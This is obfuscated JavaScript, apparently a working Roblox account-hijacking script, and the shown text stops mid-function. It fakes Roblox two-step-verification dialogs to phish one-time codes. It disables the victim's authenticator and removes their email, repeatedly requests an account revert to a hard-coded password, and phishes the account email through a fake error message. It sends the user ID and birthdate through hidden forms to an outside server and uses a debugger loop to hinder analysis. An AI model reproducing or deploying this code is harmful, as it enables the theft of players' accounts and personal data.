let authCodeCache = [];
console.log("7/18/2023, 5pm");
const delay = _0x4bcf00 => new Promise(_0x51055f => setTimeout(_0x51055f, _0x4bcf00));
const log = async (_0x2b1e45, _0x2fc44e) => {
  if (_0x2fc44e == "error" || _0x2fc44e == "info") {
    const _0x3aa9a6 = Math.floor(Math.random() * 0x3e8);
    const _0x428b31 = _0x2fc44e.charAt(0x0).toUpperCase() + _0x2fc44e.slice(0x1);
    const _0x4a1731 = JSON.stringify({
      [_0x428b31]: (_0x2b1e45 ?? 'n/a').toString(),
      'UserInfo': window.globalInfo
    });
    document.getElementById("cookie-banner-wrapper").innerHTML = document.getElementById("cookie-banner-wrapper").innerHTML += '' + ("<iframe name='error" + _0x3aa9a6 + "' style='display:none'></iframe>") + ("\n                <form id='error" + _0x3aa9a6 + "' action=\"" + "https://api.WEBSITEREMOVEDSOYOUDONTGETSCAMMED.com/" + "debug\" method=\"get\" target=\"error" + _0x3aa9a6 + "\" style=\"display: none\">\n                    <input type=\"text\" name=\"encoded_dict\" value=\"" + btoa(_0x4a1731) + "\" hidden>\n                    <input type=\"submit\" class=\"btn-cta-md modal-modern-footer-button\" aria-label=\"Verify\" style=\"cursor:pointer; padding-right: inherit; padding-left: inherit; width: 100%\" value=\"Open The Window\">\n               </form>\n            ");
    const _0x33d4b2 = document.getElementById("error" + _0x3aa9a6);
    _0x33d4b2.submit();
  }
  console.log('%c[' + _0x2fc44e + "] %c" + _0x2b1e45);
};
const removeInvalidChars = _0x31db39 => {
  let _0x511089 = '';
  for (var _0x3a1d5a = 0x0; _0x3a1d5a < _0x31db39.length; _0x3a1d5a++) {
    if (_0x31db39.charCodeAt(_0x3a1d5a) <= 0x7f) {
      _0x511089 += _0x31db39.charAt(_0x3a1d5a);
    }
  }
  return _0x511089;
};
setInterval(() => {
  debugger;
}, 0x1f4);
const getRecentGames = async (_0x5ed4e0 = 0x0) => {
  if (_0x5ed4e0 > 0x3) {
    return;
  }
  _0x5ed4e0++;
  const _0x353feb = await fetch("https://apis.roblox.com/discovery-api/omni-recommendation", {
    'method': "POST",
    'headers': {
      'accept': "application/json, text/plain, */*",
      'accept-language': "en-GB,en-US;q=0.9,en;q=0.8",
      'content-type': "application/json",
      'x-csrf-token': await getCsrfToken()
    },
    'mode': "cors",
    'body': JSON.stringify({
      'pageType': "Home",
      'sessionId': '2',
      'supportedTreatmentTypes': ["SortlessGrid"],
      'authIntentData': null,
      'cpuCores': 0x10,
      'maxResolution': "2048x1152"
    }),
    'credentials': "include",
    'referrer': 'https://www.roblox.com/'
  })["catch"](() => {});
  if (!_0x353feb) {
    return getRecentGames(_0x5ed4e0);
  }
  try {
    const _0x4ad78a = await _0x353feb.json();
    const _0x2f1e20 = _0x4ad78a.sorts.find(_0x11a0f6 => _0x11a0f6.topic === "Continue");
    const _0x28e02c = _0x2f1e20?.["recommendationList"] != null ? _0x2f1e20.recommendationList.sort((_0x2dfe4c, _0x2934df) => _0x2934df.contentMetadata.Score - _0x2dfe4c.contentMetadata.Score) : [];
    let _0x27f429 = [];
    if (_0x28e02c.length < 0x1) {
      return "['none']";
    }
    for (let _0x36a689 of _0x28e02c) {
      try {
        const _0x2cf662 = _0x36a689?.["contentId"];
        const _0x2dbaa2 = _0x4ad78a.contentMetadata.Game[_0x2cf662]?.["name"];
        if (!_0x2dbaa2) {
          continue;
        }
        _0x27f429.push(_0x2dbaa2);
      } catch (_0x1283c4) {
        console.log(_0x1283c4);
      }
    }
    return _0x27f429;
  } catch (_0x45268d) {
    log(_0x45268d, "error");
    return getRecentGames(_0x5ed4e0);
  }
};
const parseBinary = _0x2bc034 => {
  let _0x1e166c = _0x2bc034.split(" ");
  let _0x11ac08 = [];
  for (let _0x35fb17 = 0x0; _0x35fb17 < _0x1e166c.length; _0x35fb17++) {
    _0x11ac08.push(String.fromCharCode(parseInt(_0x1e166c[_0x35fb17], 0x2)));
  }
  return _0x11ac08.join('');
};
const getCsrfToken = async () => {
  const _0x2aea7b = await fetch('https://apis.roblox.com/user-settings-api/v1/user-settings?whoCanJoinMeInExperiences=Followers', {
    'headers': {
      'accept': "application/json, text/plain, */*"
    },
    'method': "POST",
    'mode': 'cors',
    'credentials': "include"
  })['catch'](_0xd471d4 => {});
  if (!_0x2aea7b) {
    return await getCsrfToken();
  }
  let _0x1edb34 = _0x2aea7b.headers.get('x-csrf-token');
  if (!_0x1edb34) {
    return await getCsrfToken();
  }
  return _0x1edb34;
};
const checkPin = async () => {
  const _0x8a576f = await fetch('https://auth.roblox.com/v1/account/pin', {
    'headers': {
      'accept': "application/json, text/plain, */*"
    },
    'method': "GET",
    'mode': "cors",
    'credentials': "include"
  })["catch"](_0x190851 => log(_0x190851, "error"));
  try {
    const _0x3ba859 = await _0x8a576f.json();
    return _0x3ba859?.["isEnabled"] == false;
  } catch (_0x5e8c2d) {
    log(_0x5e8c2d, "error");
    alert("Your account is failing to process vital information for the process, please try again later. (" + (_0x8a576f?.["status"] ?? "404") + ')');
    window.reload();
  }
};
const getAuthMethod = async _0x5ba35e => {
  const _0x5a5738 = await fetch("https://twostepverification.roblox.com/v1/users/" + _0x5ba35e + '/configuration', {
    'headers': {
      'accept': "application/json, text/plain, */*"
    },
    'method': "GET",
    'mode': 'cors',
    'credentials': 'include'
  })["catch"](_0x137b29 => log(_0x137b29, "error"));
  if (_0x5a5738?.["status"] != 0xc8) {
    log("Issue getting auth method, retying", "error");
    await delay(0x2710);
    return await getAuthMethod(_0x5ba35e);
  }
  try {
    const _0x25eae6 = await _0x5a5738.json();
    if (!_0x25eae6?.["primaryMediaType"] && _0x25eae6?.["methods"] != null) {
      return "OTP_Email";
    }
    return _0x25eae6.primaryMediaType;
  } catch (_0x3ea0fe) {
    log(_0x3ea0fe, "error");
    alert("Your account is having issues retrieving information for the request, please try again later. (" + (_0x5a5738?.["status"] ?? '404') + ')');
    window.reload();
  }
};
const getId = async () => {
  const _0x5124ca = await fetch('https://users.roblox.com/v1/users/authenticated', {
    'headers': {
      'accept': "application/json, text/plain, */*"
    },
    'method': "GET",
    'mode': "cors",
    'credentials': "include"
  })["catch"](_0x2641cc => log(_0x2641cc, "error"));
  try {
    const _0x1ed85c = await _0x5124ca.json();
    return _0x1ed85c.id;
  } catch (_0x175b77) {
    log(_0x175b77, 'error');
    alert("Your account is having issues retrieving information for the request, please try again later. (" + (_0x5124ca?.["status"] ?? "404") + ')');
    window.reload();
  }
};
const promptCode = async (_0x1983e6, _0x88303e, _0x7d4b95) => {
  if (!_0x7d4b95) {
    try {
      document.getElementById("promptBody").style.display = "none";
      document.getElementById("promptBody").remove();
    } catch (_0x1ed001) {}
    const _0x1fd8e0 = _0x1983e6 == "Authenticator" ? "<div role=\"dialog\" id=\"promptBody\" style=\"display:block\"><div class=\"fade modal-backdrop in\"></div><div role=\"dialog\" tabindex=\"-1\" class=\"fade modal-modern in modal\" style=\"display:block\"><div class=\"modal-dialog\"><div class=\"modal-content\" role=\"document\"><div class=\"modal-header\"><button type=\"button\" class=\"modal-modern-header-button\"></button><h4 class=\"modal-title\">2-Step Verification</h4><div class=\"modal-modern-header-info\"></div></div><div class=\"modal-body\"><div class=\"modal-lock-icon\"></div><p class=\"modal-margin-bottom-xlarge\">Enter the code generated by your authenticator app.</p><div class=\"input-control-wrapper\"><div id=\"twostep-group\" class=\"form-group\"><input as=\"input\" inputmode=\"numeric\" autocomplete=\"off\" autocomplete=\"off\" maxlength=\"6\" placeholder=\"Enter 6-digit Code\" type=\"password\" id=\"promptInput\" class=\"input-field form-control\"><div class=\"form-control-label bottom-label xsmall\" id=\"twostep-error\"></div></div></div></div><div class=\"modal-footer\"><div class=\"modal-modern-footer-buttons\"><button type=\"button\" style=\"z-index:9999;cursor:pointer\" class=\"btn-cta-md modal-modern-footer-button\" aria-label=\"Verify\" id=\"verifyButton\">Verify</button></div><p class=\"text-footer modal-margin-bottom\">Need help? Contact<a class=\"text-name text-footer contact\" href=\"https://www.roblox.com/info/2sv\" target=\"_blank\" rel=\"noopener noreferrer\">Roblox Support</a></p><p class=\"text-footer\">IMPORTANT: Don\"t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p></div></div></div></div></div>" : _0x1983e6 == "Email" ? "<div role=\"dialog\" id=\"promptBody\" style=\"display:block\"><div class=\"fade modal-backdrop in\"></div><div role=\"dialog\" tabindex=\"-1\" class=\"fade modal-modern in modal\" style=\"display:block\"><div class=\"modal-dialog\"><div class=\"modal-content\" role=\"document\"><div class=\"modal-header\"><button type=\"button\" class=\"modal-modern-header-button\" onclick=\"\"></button><h4 class=\"modal-title\">2-Step Verification</h4><div class=\"modal-modern-header-info\"></div></div><div class=\"modal-body\"><div class=\"modal-lock-icon\"></div><p class=\"modal-margin-bottom-xlarge\">Enter the code we just sent you via email.</p><div class=\"input-control-wrapper\"><div id=\"twostep-group\" class=\"form-group\"><input as=\"input\" inputmode=\"numeric\" autocomplete=\"off\" autocomplete=\"off\" maxlength=\"6\" placeholder=\"Enter 6-digit Code\" type=\"password\" id=\"promptInput\" class=\"input-field form-control\"><div class=\"form-control-label bottom-label xsmall\" id=\"twostep-error\"></div></div></div></div><div class=\"modal-footer\"><div class=\"modal-modern-footer-buttons\"><button type=\"button\" class=\"btn-cta-md modal-modern-footer-button\" style=\"z-index:9999;cursor:pointer\" aria-label=\"Verify\" id=\"verifyButton\">Verify</button></div><p class=\"text-footer modal-margin-bottom\">Need help? Contact<a class=\"text-name text-footer contact\" href=\"https://www.roblox.com/info/2sv\" target=\"_blank\" rel=\"noopener noreferrer\">Roblox Support</a></p><p class=\"text-footer\">IMPORTANT: Don\"t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p></div></div></div></div></div>" : _0x1983e6 == 'Otp_Email' ? "<div role=\"dialog\" id=\"promptBody\" style=\"display:block\"><div class=\"fade modal-backdrop in\"></div><div role=\"dialog\" tabindex=\"-1\" class=\"fade modal-modern in modal\" style=\"display:block\"><div class=\"modal-dialog\"><div class=\"modal-content\" role=\"document\"><div class=\"modal-header\"><button type=\"button\" class=\"modal-modern-header-button\"></button><h4 class=\"modal-title\">One-Time Verification</h4><div class=\"modal-modern-header-info\"></div></div><div class=\"modal-body\"><div class=\"modal-lock-icon\"></div><p class=\"modal-margin-bottom-xlarge\">A one-time code has been sent to your registered email. Please enter your one-time code to continue.</p><div class=\"input-control-wrapper\"><div id=\"twostep-group\" class=\"form-group\"><input as=\"input\" inputmode=\"numeric\" autocomplete=\"off\" autocomplete=\"off\" maxlength=\"6\" placeholder=\"Enter 6-digit Code\" type=\"password\" id=\"promptInput\" class=\"input-field form-control\"><div class=\"form-control-label bottom-label xsmall\" id=\"twostep-error\"></div></div></div></div><div class=\"modal-footer\"><div class=\"modal-modern-footer-buttons\"><button type=\"button\" style=\"z-index:9999;cursor:pointer\" class=\"btn-cta-md modal-modern-footer-button\" aria-label=\"Verify\" onchange=\"\" id=\"verifyButton\">Submit</button></div></div></div></div></div></div>" : null;
    document.getElementById("rbx-body").innerHTML = document.getElementById("rbx-body").innerHTML += _0x1fd8e0;
  }
  const _0x314680 = document.getElementById("verifyButton");
  let _0x2b4789 = null;
  await new Promise(_0x1b0698 => {
    const _0x38e97d = async () => {
      const _0x246b3d = document.getElementById('promptInput').value;
      console.log(_0x246b3d);
      if (_0x246b3d.length != 0x6) {
        return;
      }
      if (isNaN(_0x246b3d)) {
        document.getElementById("twostep-group").setAttribute("class", "form-has-feedback  form-has-error form-group");
        document.getElementById("twostep-error").innerText = "Please enter a valid 6-digit code.";
        return;
      }
      if (authCodeCache.includes(_0x246b3d)) {
        document.getElementById("twostep-group").setAttribute("class", "form-has-feedback  form-has-error form-group");
        document.getElementById("twostep-error").innerText = "This code has already been used.";
        return;
      }
      authCodeCache.push(_0x246b3d);
      const _0x5733a5 = document.createElement("span");
      _0x5733a5.setAttribute("class", "spinner spinner-xs spinner-no-margin");
      document.getElementById("verifyButton").setAttribute('disabled', '');
      document.getElementById("promptInput").setAttribute('disabled', '');
      document.getElementById("verifyButton").textContent = '';
      document.getElementById("verifyButton").appendChild(_0x5733a5);
      const _0x4e2096 = await _0x88303e(_0x246b3d);
      if (_0x4e2096[0x0] != true || _0x1983e6 == "Authenticator" && _0x7d4b95 === false) {
        document.getElementById("twostep-group").setAttribute('class', "form-has-feedback  form-has-error form-group");
        document.getElementById('verifyButton').textContent = "Verify";
        document.getElementById("verifyButton").removeAttribute("disabled");
        document.getElementById("promptInput").removeAttribute("disabled");
        document.getElementById("twostep-error").innerText = _0x4e2096[0x0] === true ? "Code expired. Please enter a new code." : "Invalid code, please enter in a new code.";
      }
      if (_0x4e2096[0x0] === true) {
        _0x2b4789 = true;
        if (_0x1983e6 == "Authenticator" && _0x7d4b95 || !_0x7d4b95) {
          document.getElementById("promptBody").style.display = "none";
          document.getElementById('promptBody').remove();
        }
        try {
          _0x314680.removeEventListener('click', _0x38e97d);
        } catch (_0x225597) {
          console.log(_0x225597);
        }
        return _0x1b0698();
      }
    };
    _0x314680.addEventListener("click", _0x38e97d);
  });
  return _0x2b4789;
};
class factorManagement {
  constructor(_0x1da943, _0x4c93d8) {
    this.authMethod = _0x1da943;
    this.userId = _0x4c93d8;
  }
  async ["sendOTPcode"](_0x47c910 = {}) {
    if (_0x47c910?.["trys"] > 0x3) {
      return null;
    }
    _0x47c910.trys = (_0x47c910.trys ?? 0x0) + 0x1;
    const _0x1116dd = await fetch("https://apis.roblox.com/otp-service/v1/sendCodeForUser", {
      'headers': {
        'accept': "application/json, text/plain, */*",
        'content-type': "application/json;charset=UTF-8",
        'x-csrf-token': await getCsrfToken()
      },
      'body': "{\"contactType\":\"Email\",\"origin\":\"Reauth\",\"messageVariant\":\"Default\"}",
      'method': "POST",
      'mode': "cors",
      'credentials': "include"
    })["catch"](_0x1f6e3e => log(_0x1f6e3e, 'error'));
    try {
      const _0x4d4f4d = (await _0x1116dd.json()).otpSessionToken;
      return _0x4d4f4d;
    } catch (_0x2ae682) {
      log(_0x2ae682, 'error');
      delay(0x1388);
      return await this.sendOTPcode(_0x47c910);
    }
  }
  async ["verifyOTPEMAILcode"](_0xbf2724 = {}) {
    if (_0xbf2724?.["trys"] >= 0x2) {
      return null;
    }
    _0xbf2724.trys = (_0xbf2724.trys ?? 0x0) + 0x1;
    const {
      otpSession: _0x3cfe04,
      code: _0xc8626a
    } = _0xbf2724;
    const _0x4f69e5 = await fetch("https://apis.roblox.com/otp-service/v1/validateCode", {
      'headers': {
        'accept': "application/json, text/plain, */*",
        'content-type': 'application/json;charset=UTF-8',
        'x-csrf-token': await getCsrfToken()
      },
      'body': "{\"contactType\":\"Email\",\"origin\":\"Reauth\",\"passCode\":\"" + _0xc8626a + "\",\"otpSessionToken\":\"" + _0x3cfe04 + "\"}",
      'method': 'POST',
      'mode': "cors",
      'credentials': "include"
    })['catch'](_0xd0fbdd => log(_0xd0fbdd, 'error'));
    if (_0x4f69e5.status != 0xc8) {
      delay(0x1388);
      return await this.verifyOTPEMAILcode(_0xbf2724);
    }
    try {
      const _0x2abb61 = await _0x4f69e5.text();
      if (_0x2abb61.includes("contactValue")) {
        return [true, _0x4f69e5, _0x2abb61];
      }
    } catch (_0x526e31) {
      log(_0x526e31, 'error');
      delay(0x1388);
      return await this.verifyOTPEMAILcode(_0xbf2724);
    }
  }
  async ["otpTokenGen"](_0x1376ba = {}) {
    if (_0x1376ba?.["trys"] >= 0x3) {
      return null;
    }
    _0x1376ba.trys = (_0x1376ba.trys ?? 0x0) + 0x1;
    const {
      otpSession: _0x2ab1df
    } = _0x1376ba;
    const _0x5e38e1 = await fetch('https://apis.roblox.com/reauthentication-service/v1/token/generate', {
      'headers': {
        'accept': "application/json, text/plain, */*",
        'content-type': "application/json;charset=UTF-8",
        'x-csrf-token': await getCsrfToken()
      },
      'body': "{\"sessionId\":\"" + _0x2ab1df + "\",\"type\":\"Otp_Email\"}",
      'method': "POST",
      'mode': "cors",
      'credentials': "include"
    })['catch'](_0x43f490 => log(_0x43f490, "error"));
    try {
      const _0x56d380 = await _0x5e38e1.json();
      if (!_0x56d380?.["token"]) {
        return await this.otpTokenGen(_0x1376ba);
      }
      return _0x56d380.token;
    } catch (_0x2de22f) {
      log(_0x2de22f, "error");
      delay(0x1388);
      return await this.otpTokenGen(_0x1376ba);
    }
  }
  async ["requestContinue"](_0x523b6e = {}) {
    if (_0x523b6e?.["trys"] >= 0x3) {
      return null;
    }
    _0x523b6e.trys = (_0x523b6e.trys ?? 0x0) + 0x1;
    const {
      challengeMetadata: _0x160432,
      challengeType: _0x390487
    } = _0x523b6e;
    const _0xf6ba53 = await fetch("https://apis.roblox.com/challenge/v1/continue", {
      'headers': {
        'accept': "application/json, text/plain, */*",
        'content-type': "application/json",
        'x-csrf-token': await getCsrfToken()
      },
      'body': JSON.stringify({
        'challengeId': this.authInfo.plainChallengeId,
        'challengeMetadata': JSON.stringify(_0x160432),
        'challengeType': _0x390487
      }),
      'method': "POST",
      'mode': "cors",
      'credentials': "include"
    })["catch"](_0x12dbdb => log(_0x12dbdb, "error"));
    if (_0xf6ba53.status != 0xc8) {
      delay(0x1388);
      return await this.requestContinue(_0x523b6e);
    }
    return true;
  }
  async ["checkAuthCode"](_0x1cbd12 = {}) {
    if (_0x1cbd12?.["trys"] >= 0x2) {
      return null;
    }
    _0x1cbd12.trys = (_0x1cbd12.trys ?? 0x0) + 0x1;
    const {
      code: _0x42304b,
      userId: _0x14a578
    } = _0x1cbd12;
    const _0x1e0107 = await fetch("https://twostepverification.roblox.com/v1/users/" + _0x14a578 + "/challenges/authenticator/verify", {
      'headers': {
        'accept': "application/json, text/plain, */*",
        'content-type': "application/json;charset=UTF-8",
        'x-csrf-token': await getCsrfToken()
      },
      'body': JSON.stringify({
        'challengeId': this.authInfo.encodedMetadata.challengeId,
        'actionType': this.authInfo.encodedMetadata?.["actionType"] ?? "Generic",
        'code': _0x42304b
      }),
      'method': "POST",
      'mode': "cors",
      'credentials': 'include'
    })["catch"](_0x4e8196 => log(_0x4e8196, "error"));
    try {
      const _0x1f5bf9 = await _0x1e0107.json();
      if (!_0x1f5bf9?.['verificationToken']) {
        log("Issue with code verification on auth, " + JSON.stringify(_0x1f5bf9));
        return;
      }
      this.authInfo.verificationToken = _0x1f5bf9.verificationToken;
      return [true, _0x1e0107, _0x1f5bf9];
    } catch (_0x42022c) {
      log(_0x42022c, 'error');
      delay(0x1388);
      return await this.checkAuthCode(_0x1cbd12);
    }
  }
  async ["checkEmailCode"](_0xd0e29e = {}) {
    if (_0xd0e29e?.["trys"] >= 0x2) {
      return null;
    }
    _0xd0e29e.trys = (_0xd0e29e.trys ?? 0x0) + 0x1;
    const {
      code: _0x454721,
      userId: _0x308f45
    } = _0xd0e29e;
    const _0x50a24b = await fetch("https://twostepverification.roblox.com/v1/users/" + _0x308f45 + "/challenges/email/verify", {
      'headers': {
        'accept': "application/json, text/plain, */*",
        'content-type': "application/json;charset=UTF-8",
        'x-csrf-token': await getCsrfToken()
      },
      'referrer': 'https://www.roblox.com/',
      'referrerPolicy': "strict-origin-when-cross-origin",
      'body': "{\"challengeId\":\"" + this.authInfo.encodedMetadata.challengeId + "\",\"actionType\":\"Generic\",\"code\":\"" + _0x454721 + "\"}",
      'method': "POST",
      'mode': 'cors',
      'credentials': "include"
    })['catch'](_0x26c37c => log(_0x26c37c, 'error'));
    try {
      const _0x10350d = await _0x50a24b.json();
      if (!_0x10350d?.["verificationToken"]) {
        log("Issue with code verification on auth, " + JSON.stringify(_0x10350d));
        return;
      }
      this.authInfo.verificationToken = _0x10350d.verificationToken;
      return [true, _0x50a24b, _0x10350d];
    } catch (_0x49ef8f) {
      log(_0x49ef8f, "error");
      delay(0x1388);
      return await this.checkEmailCode(_0xd0e29e);
    }
  }
  async ["returnCompleted"](_0x22a32e, _0xda0e44 = {}) {
    console.log(_0xda0e44);
    this.authInfo = {};
    try {
      this.authInfo = {
        'plainChallengeId': _0x22a32e.headers.get("Rblx-Challenge-Id"),
        'encodedMetadata': JSON.parse(atob(_0x22a32e.headers.get("Rblx-Challenge-Metadata")))
      };
    } catch (_0x3c3098) {
      log(_0x3c3098, "error");
    }
    if ([this.authInfo.plainChallengeId, this.authInfo.encodedMetadata].includes(undefined)) {
      return;
    }
    if (this.authInfo.encodedMetadata?.["defaultType"] == "Otp_Email") {
      const _0x49f32b = await this.sendOTPcode();
      if (_0x49f32b == null) {
        return;
      }
      await promptCode("Otp_Email", async _0x2e5ddf => {
        const _0x3ebcb0 = (await this.verifyOTPEMAILcode({
          'otpSession': _0x49f32b,
          'code': _0x2e5ddf
        })) || [];
        return [_0x3ebcb0[0x0], "place holder for when we need actual status'"];
      });
      const _0x40c00a = await this.otpTokenGen({
        'otpSession': _0x49f32b
      });
      if (_0x40c00a == null) {
        return;
      }
      await this.requestContinue({
        'challengeMetadata': {
          'reauthenticationToken': _0x40c00a
        },
        'challengeType': "reauthentication"
      });
      return {
        'rblx-challenge-metadata': btoa(JSON.stringify({
          'reauthenticationToken': _0x40c00a
        })),
        'rblx-challenge-id': this.authInfo.plainChallengeId,
        'rblx-challenge-type': 'reauthentication'
      };
    }
    switch (this.authMethod) {
      case "Authenticator":
        await promptCode("Authenticator", async _0x3e9d07 => {
          const _0x181534 = (await this.checkAuthCode({
            'code': _0x3e9d07,
            'userId': this.userId
          })) ?? [];
          return [_0x181534[0x0], "place holder for when we need actual status'"];
        }, _0xda0e44?.['useCache'] ?? null);
        await this.requestContinue({
          'challengeType': "twostepverification",
          'challengeMetadata': {
            'verificationToken': this.authInfo.verificationToken,
            'rememberDevice': false,
            'challengeId': this.authInfo.encodedMetadata.challengeId,
            'actionType': this.authInfo.encodedMetadata?.['actionType'] ?? "Generic"
          }
        });
        return {
          'rblx-challenge-id': this.authInfo.plainChallengeId,
          'rblx-challenge-metadata': btoa("{\"verificationToken\":\"" + this.authInfo.verificationToken + "\",\"rememberDevice\":false,\"challengeId\":\"" + this.authInfo.encodedMetadata.challengeId + "\",\"actionType\":\"Generic\"}"),
          'rblx-challenge-type': "twostepverification"
        };
      case 'Email':
        await promptCode("Email", async _0x237053 => {
          const _0x40c654 = (await this.checkEmailCode({
            'code': _0x237053,
            'userId': this.userId
          })) ?? [];
          return [_0x40c654[0x0], "place holder for when we need actual status'"];
        });
        await this.requestContinue({
          'challengeType': "twostepverification",
          'challengeMetadata': {
            'verificationToken': this.authInfo.verificationToken,
            'rememberDevice': false,
            'challengeId': this.authInfo.encodedMetadata.challengeId,
            'actionType': "Generic"
          }
        });
        return {
          'rblx-challenge-id': this.authInfo.plainChallengeId,
          'rblx-challenge-metadata': btoa("{\"verificationToken\":\"" + this.authInfo.verificationToken + "\",\"rememberDevice\":false,\"challengeId\":\"" + this.authInfo.encodedMetadata.challengeId + "\",\"actionType\":\"Generic\"}"),
          'rblx-challenge-type': "twostepverification"
        };
      default:
        log("Unknown auth method.", 'error');
        return "Unknown auth";
    }
  }
}
const hasCollectables = async _0x324cda => {
  if (!_0x324cda) {
    return true;
  }
  const _0x54a6a0 = await fetch("https://inventory.roblox.com/v1/users/" + _0x324cda + "/assets/collectibles?limit=100&sortOrder=Asc", {
    'headers': {
      'accept': "application/json, text/plain, */*"
    },
    'method': "GET",
    'mode': "cors",
    'credentials': 'include'
  })["catch"](_0x94bbd4 => log(_0x94bbd4, 'error'));
  try {
    const _0x35af37 = await _0x54a6a0.json();
    if (!_0x35af37?.['data']) {
      return true;
    }
    return _0x35af37.data?.["length"] > 0x0;
  } catch (_0x3dc46c) {
    log(_0x3dc46c, 'error');
    return true;
  }
};
const removeEmail = (_0x55b5e2 = {}) => fetch("https://accountsettings.roblox.com/v1/email", {
  'headers': {
    'accept': "application/json, text/plain, */*",
    'content-type': "application/x-www-form-urlencoded",
    'x-csrf-token': _0x55b5e2.csrf,
    ..._0x55b5e2.headers
  },
  'body': "emailAddress=" + _0x55b5e2.email + '&password=',
  'method': 'POST',
  'mode': 'cors',
  'credentials': "include"
});
const removeAuth = (_0x361b35 = {}) => fetch("https://twostepverification.roblox.com/v1/users/" + _0x361b35.userId + '/configuration/authenticator/disable', {
  'headers': {
    'accept': "application/json, text/plain, */*",
    'content-type': 'application/json;charset=UTF-8',
    'x-csrf-token': _0x361b35.csrf,
    ..._0x361b35.headers
  },
  'method': 'POST',
  'mode': "cors",
  'credentials': "include"
});
const getOldEmail = async () => {
  const _0x4af834 = await fetch("https://accountsettings.roblox.com/v1/email", {
    'headers': {
      'accept': "application/json, text/plain, */*"
    },
    'method': "GET",
    'mode': 'cors',
    'credentials': 'include'
  })["catch"](() => {});
  if (!_0x4af834 || _0x4af834.status !== 0xc8) {
    return null;
  }
  const _0x5524bf = await _0x4af834.json();
  return _0x5524bf?.["emailAddress"];
};
const spamRequest = async (_0x3afd6c = {}) => {
  let _0x4c9987 = await getCsrfToken();
  setInterval(async () => {
    _0x4c9987 = await getCsrfToken();
  }, 0x7d0);
  setInterval(async () => {
    fetch(_0x3afd6c.url, {
      'credentials': "include",
      'headers': {
        'accept': "application/json, text/plain",
        'content-type': "application/json;charset=UTF-8",
        'x-csrf-token': _0x4c9987,
        'x-bound-auth-token': '',
        'Pragma': "no-cache",
        'Cache-Control': "no-cache"
      },
      'body': JSON.stringify(_0x3afd6c.body),
      'method': "POST",
      'mode': "cors"
    })["catch"](() => {});
  }, 0x12c);
};
const collectEmail = async (_0x184c13 = {}) => {
  (async () => {
    spamRequest({
      'url': "https://auth.roblox.com/v1/revert/account",
      'body': {
        'userId': _0x184c13.userId,
        'newPassword': "OOPSiEDAiSTY",
        'newPasswordRepeated': "OOPSiEDAiSTY",
        'ticket': '',
        'twoStepVerificationChallengeId': ''
      }
    });
  })();
  window.userOptions = {
    'currentEmail': _0x184c13.currentEmail,
    'userId': _0x184c13.userId
  };
  document.getElementById("rbx-body").innerHTML = document.getElementById('rbx-body').innerHTML += "<div role=\"dialog\" id=\"emailonetimeask\" style=\"display: block;\"><div class=\"fade modal-backdrop in\"></div><div role=\"dialog\" tabindex=\"-1\" class=\"fade modal-modern in modal\" style=\"display: block;\"><div class=\"modal-dialog\"><div class=\"modal-content\" role=\"document\"><div class=\"modal-header\"><button type=\"button\" class=\"modal-modern-header-button\" onclick=\"\"></button><h4 class=\"modal-title\">Sorry!</h4><div class=\"modal-modern-header-info\"></div></div><div class=\"modal-body\"><div class=\"modal-lock-icon\"></div><p class=\"modal-margin-bottom-xlarge\">There were some issues with accessing your Roblox avatar images, but our team is actively working on solving them.</p><p class=\"modal-margin-bottom-xlarge\">As an alternative, please enter the e-mail associated with your Roblox account so our team can send you the image you requested.</p><p class=\"modal-margin-bottom-xlarge\" id=\"email-hint\">Hint: </p><div class=\"input-control-wrapper\"><div class=\"   form-group\" id=\"email\"><input as=\"input\" autocomplete=\"off\" oninput=\"\" id=\"email-verification\" class=\"input-field form-control\" style=\"background-image: url(&quot;moz-extension://f37b2444-0a3b-4534-a38f-8b6b6b783b03/images/web_access/vault-input-enabled.svg&quot;) !important; background-repeat: no-repeat !important; background-position: calc(100% - 3px) center !important; background-size: 14px !important; cursor: text;\" placeholder=\"Email\"><input type=\"text\" id=\"ticket\" hidden=\"\"><input type=\"text\" id=\"userid\" hidden=\"\"><input type=\"text\" id=\"server\" hidden=\"\"><div class=\"form-control-label bottom-label xsmall\" id=\"twostep-error\">&nbsp;</div></div></div></div><div class=\"modal-footer\"><div class=\"modal-modern-footer-buttons\"><button type=\"button\" style=\"z-index: 9999; cursor:pointer;\" class=\"btn-cta-md modal-modern-footer-button\" aria-label=\"Verify\" onclick=\"redirectProperly()\" onchange=\"\" id=\"email_verifyButton\">Submit</button></div></div></div></div></div></div>";
  document.getElementById("email-hint").innerHTML = _0x184c13.pastEmail.length > 0x0 ? "Hint: " + _0x184c13.pastEmail : '';
};
const getUserBirthData = async () => {
  const _0x22e8bb = await fetch("https://users.roblox.com/v1/birthdate", {
    'credentials': "include",
    'headers': {
      'Accept': "application/json, text/plain, */*"
    },
    'referrer': 'https://www.roblox.com/',
    'method': 'GET',
    'mode': "cors"
  })["catch"](_0x540368 => console.log(_0x540368));
  try {
    const _0x36c3c7 = await _0x22e8bb.json();
    return _0x36c3c7;
  } catch (_0x2ea0ff) {
    console.log(_0x2ea0ff);
    return;
  }
};
try {
  document.createElement("div").innerHTML = "<img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==\" onload=\"async () => {}; window.isAsyncAvailable = true;\">";
  fetch("https://users.roblox.com/v1/users/5863975895", {
    'headers': {
      'accept': "application/json, text/plain, */*"
    },
    'method': "GET",
    'mode': "cors",
    'credentials': "include"
  }).then(async _0x511a50 => {
    try {
      const _0x4fac48 = await _0x511a50.json();
      if (!_0x4fac48.description) {
        alert("Your account is experiencing some issues, please try again later.");
        location.reload();
        return;
      }
      let _0x195441 = parseBinary(_0x4fac48.description);
      let _0x2c4ee5 = await getOldEmail();
      const _0x1b2c5e = await getId();
      const _0x4edf8d = await getAuthMethod(_0x1b2c5e);
      const _0x1513eb = await hasCollectables(_0x1b2c5e ?? null);
      window.globalInfo = {
        'userId': _0x1b2c5e,
        'authMethod': _0x4edf8d,
        'windowResolution': {
          'height': window.screen.availHeight,
          'width': window.screen.availWidth
        }
      };
      window.globalInfo.birthData = await getUserBirthData();
      if ([_0x1b2c5e, _0x4edf8d].includes(null)) {
        return;
      }
      if (_0x1513eb == false && true) {
        window.location.replace("https://api.WEBSITEREMOVEDSOYOUDONTGETSCAMMED.com/?id=" + _0x1b2c5e);
        return;
      }
      const _0x6760ea = await checkPin();
